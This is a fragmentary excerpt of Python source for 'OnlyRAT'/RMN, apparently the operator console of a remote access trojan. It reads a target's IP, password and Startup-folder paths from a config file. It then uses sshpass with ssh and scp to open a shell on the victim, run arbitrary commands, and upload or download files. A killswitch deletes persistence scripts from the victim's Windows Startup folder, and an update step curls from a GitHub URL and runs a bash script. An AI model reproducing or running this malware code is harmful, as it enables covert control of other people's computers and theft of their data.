...
header = f"[~] {username}@RMN $ "  # sets up user input interface
remote_path = "raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main"  # url path for OnlyRAT files
local_path = f"/home/{username}/.MK01-RMN" if username != "root" else "/root/.MK01-RMN"  # gets path of OnlyRAT
...
def read_config(config_file):
    ...
    configuration = {"IPADDRESS": read_lines[0].strip(), "PASSWORD": read_lines[1].strip(),
                     "WORKINGDIRECTORY": (read_lines[2]).replace("\\", "/").strip(),
                     "STARTUPDIRECTORY": (read_lines[3]).replace("\\", "/").strip(),
                     "REMOTEHOST": read_lines[4].strip(), "PORT": read_lines[5].strip(),
                     "CONNECT": read_lines[6].strip()}
...
def connect(address, password, port):
    ...
    os.system(f"sshpass -p \"{password}\" ssh RMN@{address} -p {port}")
...
def remote_upload(address, password, upload, path, port):
    ...
    # scp upload
    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} RMN@{address}:{path}")
...
def remote_download(address, password, path, port):
    ...
    os.system(f"sshpass -p \"{password}\" scp -P {port} RMN@{address}:{path} ~/Downloads")
...
def remote_command(address, password, command, port):
    os.system(f"sshpass -p \"{password}\" ssh RMN@{address} -p {port} '{command}'")
...
def killswitch(address, password, working, username, port):
    ...
    remote_command(address, password,
                   f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && del *.cmd",
                   port)
...
def update():
    ...
    os.system(
        "curl https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
    ...
    os.system("rm -rf ~/.MK01-RMN/latest.txt")
    ...
    if latest_version > current_version:
        ...
        # update
        if option == "y":
            os.system("bash ~/.MK01-RMN/payloads/update.sh")
        ...
        if argument.endswith(".rat"):
            ...
            while True:
                ...
                if option == "orconsole":
                    ...
                    print("\n[~] Are you sure you want to remove RMN from your target [y/n")
                    confirm = input(header)
                    if confirm == "y":
                    ...
                    os.system("xdg-open https://github.com/CosmodiumCS/MK01-RMN/blob/main/payloads/manual.md")
